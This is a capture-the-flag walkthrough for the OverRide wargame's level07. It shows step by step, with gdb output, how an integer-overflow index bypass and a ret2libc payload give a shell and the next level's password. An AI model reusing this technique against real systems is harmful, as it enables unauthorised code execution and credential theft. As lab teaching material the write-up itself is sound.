In this level, we have a program that allows us to store/read into a local variable local_1bc [100] using two functions read_number(int param_1) and store_number(int param_1).

For this level, we will use the ret2libc method to achieve our goals. Here is an explanatory link about this method -> https://beta.hackndo.com/retour-a-la-libc/
We will use the store_number(int param_1) function to write our instructions into EIP and then retrieve our flag. So, objective 1: find EIP, objective 2: determine what we will write into EIP.


When disassembling the code, we can see that the local variable into which we write or read is located at esp+0x24.
```asm
0x080488e1 <+446>:   jne    0x80488f8 <main+469>
0x080488e3 <+448>:   lea    0x24(%esp),%eax
0x080488e7 <+452>:   mov    %eax,(%esp)
0x080488ea <+455>:   call   0x8048630 <store_number>
```
Therefore, we can retrieve the beginning of the buffer on the stack. 

```
Breakpoint 2, 0x080488e1 in main ()
(gdb) x/x $esp+0x24
0xffffd554:     0x00000000
```

We know that main returns to 0x080489f1 using gdb, we can find where this instruction is located in the stack.

```
0x080489f1 <+718>:   ret
```

```
Breakpoint 3, 0x080489f1 in main ()
(gdb) x/x $esp
0xffffd71c:     0xf7e45513
```

By subtracting these two addresses, we find 0x1C8, which we will divide by 4 since we move in blocks of 4, and we find the index that will allow us to write into EIP. 114

```
0xffffd71c - 0xffffd554 = 0x1C8 (456)
index = 114 because 456 / 4 = 114
```

Now let's retrieve the address of system and the string "/bin/sh".

```
(gdb) p system
	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find __libc_start_main,+99999999,"/bin/sh"
	0xf7f897ec
```

The decimal representation of these two addresses gives us
```
system = 0xf7e6aed0 = 4159090384
"/bin/sh" = 0xf7f897ec = 4160264172
```

Now we need to address a problem, which is as follows: the number corresponding to the index where we are going to write must not be a multiple of 3. If it is, then we get an error message.

```c
printf(" Index: ");
uVar2 = get_unum();
if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
  puts(" *** ERROR! ***");
  puts("   This index is reserved for wil!");
  puts(" *** ERROR! ***");
  uVar3 = 1;
}
```

And as luck would have it, 114 is a multiple of 3. So what we're going to do is trigger an integer overflow using this formula: (2**32 / 4) + 114.
We divide by 4 because in the program, the number of index is multiplied by 4.
```c
*(uint *)(uVar2 * 4 + param_1) = uVar1;
```

```python
(2**32 / 4) + 114 = 1073741938
>>> 1073741938 % 3 == 0
False
```
(2**32 / 4) + 114 = 1073741938, and this last number is not a multiple of 3, which is perfect. 
But we also need to write into EIP + 2 which will store the /bin/sh, and unfortunately...

```python
>>> 1073741940 % 3 == 0
True
```

However, in the case where we overflow a second time, we can retrieve both indexes without them being multiples of 3

```python
2 * (2**32 / 4) + 114 = 2147483762
>>> 2147483762 % 3 == 0
False
>>> 2147483764 % 3 == 0
False
```

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```